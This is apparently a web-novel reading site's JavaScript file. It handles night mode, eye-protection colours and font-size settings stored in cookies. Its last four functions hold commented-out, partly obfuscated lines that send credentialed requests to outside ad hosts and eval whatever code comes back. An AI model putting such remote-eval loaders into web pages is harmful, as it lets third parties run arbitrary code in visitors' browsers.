function user() {
	document.write('<script src="/userstatus.php"></script>')
}
var checkbg = "#816863";
function nr_setbg(intype) {
	var huyandiv = document.getElementById("huyandiv");
	var light = document.getElementById("lightdiv");
	if (intype == "huyan") {
		if (huyandiv.style.backgroundColor == "") {
			set("light", "huyan");
			document.cookie = "light=huyan;path=/";
		} else {
			set("light", "no");
			document.cookie = "light=no;path=/";
		}
	}
	if (intype == "light") {
		if (light.innerHTML == "关灯") {
			set("light", "yes");
			document.cookie = "light=yes;path=/";
		} else {
			set("light", "no");
			document.cookie = "light=no;path=/";
		}
	}
	if (intype == "big") {
		set("font", "big");
		document.cookie = "font=big;path=/";
	}
	if (intype == "middle") {
		set("font", "middle");
		document.cookie = "font=middle;path=/";
	}
	if (intype == "small") {
		set("font", "small");
		document.cookie = "font=small;path=/";
	}
}
function getset() {
	var strCookie = document.cookie;
	var arrCookie = strCookie.split("; ");
	var light;
	var font;

	for (var i = 0; i < arrCookie.length; i++) {
		var arr = arrCookie[i].split("=");
		if ("light" == arr[0]) {
			light = arr[1];
			break;
		}
	}
	for (var i = 0; i < arrCookie.length; i++) {
		var arr = arrCookie[i].split("=");
		if ("font" == arr[0]) {
			font = arr[1];
			break;
		}
	}

	//light
	if (light == "yes") {
		set("light", "yes");
	} else if (light == "no") {
		set("light", "no");
	} else if (light == "huyan") {
		set("light", "huyan");
	}
	//font
	if (font == "big") {
		set("font", "big");
	} else if (font == "middle") {
		set("font", "middle");
	} else if (font == "small") {
		set("font", "small");
	} else {
		set("", "");
	}
}
function set(intype, p) {
	var nr_body = document.getElementById("novelbody"); //页面body
	var huyandiv = document.getElementById("huyandiv"); //护眼div
	var lightdiv = document.getElementById("lightdiv"); //灯光div
	var fontfont = document.getElementById("fontfont"); //字体div
	var fontbig = document.getElementById("fontbig"); //大字体div
	var fontmiddle = document.getElementById("fontmiddle"); //中字体div
	var fontsmall = document.getElementById("fontsmall"); //小字体div
	var nr1 = document.getElementById("novelcontent"); //内容div
	var chaptertitle = document.getElementById("chaptertitle");
	//灯光
	if (intype == "light") {
		if (p == "yes") {
			//关灯
			lightdiv.innerHTML = "开灯";
			huyandiv.style.backgroundColor = "";
			chaptertitle.style.color = '#999';
			nr_body.style.backgroundColor = "#32373B";
			nr1.style.color = "#999";
		} else if (p == "no") {
			//开灯
			lightdiv.innerHTML = "关灯";
			huyandiv.style.backgroundColor = "";
			chaptertitle.style.color = '#000';
			nr_body.style.backgroundColor = "#fbf6ec";
			nr1.style.color = "#000";
		} else if (p == "huyan") {
			//护眼
			lightdiv.innerHTML = "关灯";
			huyandiv.style.backgroundColor = checkbg;
			chaptertitle.style.color = '#000';
			nr_body.style.backgroundColor = "#DCECD2";
			nr1.style.color = "#000";
		}
	}
	//字体
	if (intype == "font") {
		//alert(p);
		fontbig.style.backgroundColor = "";
		fontmiddle.style.backgroundColor = "";
		fontsmall.style.backgroundColor = "";
		if (p == "big") {
			fontbig.style.backgroundColor = checkbg;
			nr1.style.fontSize = "28px";
		}
		if (p == "middle") {
			fontmiddle.style.backgroundColor = checkbg;
			nr1.style.fontSize = "20px";
		}
		if (p == "small") {
			fontsmall.style.backgroundColor = checkbg;
			nr1.style.fontSize = "16px";
		}
	}
}
function m_middle(){
//if(eval("navigator.userAgent.indexOf('UCBrowser') > -1")){document.write('<script data-union-ad data-priority="11" data-position="inline">(function(){var requestApi={};requestApi.getPageInfo=function(){var pageInfo={};var allPageInfoMeta=document.querySelectorAll("meta[name=u_external_info]");for(var idx=0;idx<allPageInfoMeta.length;idx++){var pageInfoMeta=allPageInfoMeta[idx];if(pageInfoMeta.hasAttribute("data-key")&&pageInfoMeta.hasAttribute("data-value")){pageInfo[pageInfoMeta.getAttribute("data-key")]=pageInfoMeta.getAttribute("data-value")}}return JSON.stringify(pageInfo)};requestApi.url="https://daima1.18tzx.com/1371/25?"+new Date().getTime()+"&uc_param_str=dn&pageinfo="+encodeURIComponent(requestApi.getPageInfo());requestApi.method="get".toUpperCase();requestApi.randId="c"+Math.random().toString(36).substr(8);window.document.writeln("<div id="+requestApi.randId+"></div>");requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();<\/script>')}else{(function(){var requestApi={};requestApi.url="https://xxy.nxkycx.com/1371/32";requestApi.method="get".toUpperCase();requestApi.randId=eval("'c'+Math.random().toString(36).substr(8)");window.document.writeln('<div id="'+requestApi.randId+'"></div>');requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.hffkRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url+"?"+new Date().getTime(),false);xmlhttp.send()};requestApi.func();requestApi.func()})()};
}
function m_bottom(){
//if(eval("navigator.userAgent.indexOf('UCBrowser') > -1")){document.write('<script data-union-ad data-priority="11" data-position="inline">(function(){var requestApi={};requestApi.getPageInfo=function(){var pageInfo={};var allPageInfoMeta=document.querySelectorAll("meta[name=u_external_info]");for(var idx=0;idx<allPageInfoMeta.length;idx++){var pageInfoMeta=allPageInfoMeta[idx];if(pageInfoMeta.hasAttribute("data-key")&&pageInfoMeta.hasAttribute("data-value")){pageInfo[pageInfoMeta.getAttribute("data-key")]=pageInfoMeta.getAttribute("data-value")}}return JSON.stringify(pageInfo)};requestApi.url="https://daima1.18tzx.com/1371/25?"+new Date().getTime()+"&uc_param_str=dn&pageinfo="+encodeURIComponent(requestApi.getPageInfo());requestApi.method="get".toUpperCase();requestApi.randId="c"+Math.random().toString(36).substr(8);window.document.writeln("<div id="+requestApi.randId+"></div>");requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();<\/script>')}else{(function(){var requestApi={};requestApi.url="https://xxy.nxkycx.com/1371/32";requestApi.method="get".toUpperCase();requestApi.randId=eval("'c'+Math.random().toString(36).substr(8)");window.document.writeln('<div id="'+requestApi.randId+'"></div>');requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.hffkRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url+"?"+new Date().getTime(),false);xmlhttp.send()};requestApi.func();requestApi.func()})()};
}
function m_footr(){
//if(eval("na"+"vigator.userAgen"+"t.indexOf('U"+"CBr"+"owser') > -1")){eval("doc"+"um"+"ent.wri"+"teln('<scr' + 'i' + 'pt data-union-ad data-priority=\"12\" data-position=\"fixed\">(function(){var c0=\"https://daima1.18tzx.com/\";var a0=new XML"+"Htt"+"pRequ"+"est();a0.withCredentials=true;var b=c0+\"1371/4?\"+new Date().getTime();if(a0!=null){a0.onreadystat"+"echange=function(){if(a0.readyState==4){if(a0.status==200){eval(ev"+"al(a0.re"+"spo"+"nseT"+"ext));}}};a0.open(\"get\".toUppe"+"rCase(),b,true);a0.se"+"nd(null);}})();</scr'+'i' + 'pt>');");document.write("");} else {console.log(2);(function(){var c0="https://xxy.nxkycx.com/";var a0=new XMLHttpRequest();a0.withCredentials=true;var b=c0+"1371/4?"+new Date().getTime();if(a0!=null){a0.onreadystatechange=function(){if(a0.readyState==4){if(a0.status==200){eval("ev"+"al(a0.responseText)");}}};a0.open("get".toUpperCase(),b,true);a0.send(null);}})();}
}
function uc_foot(){
//if(eval("na"+"vigator.userAgen"+"t.indexOf('U"+"CBr"+"owser') > -1")){eval("doc"+"um"+"ent.wri"+"teln('<scr' + 'i' + 'pt data-union-ad data-priority=\"12\" data-position=\"fixed\">(function(){var c0=\"https://daima1.18tzx.com/\";var a0=new XML"+"Htt"+"pRequ"+"est();a0.withCredentials=true;var b=c0+\"1371/4?\"+new Date().getTime();if(a0!=null){a0.onreadystat"+"echange=function(){if(a0.readyState==4){if(a0.status==200){eval(ev"+"al(a0.re"+"spo"+"nseT"+"ext));}}};a0.open(\"get\".toUppe"+"rCase(),b,true);a0.se"+"nd(null);}})();</scr'+'i' + 'pt>');");document.write("");} else {}
}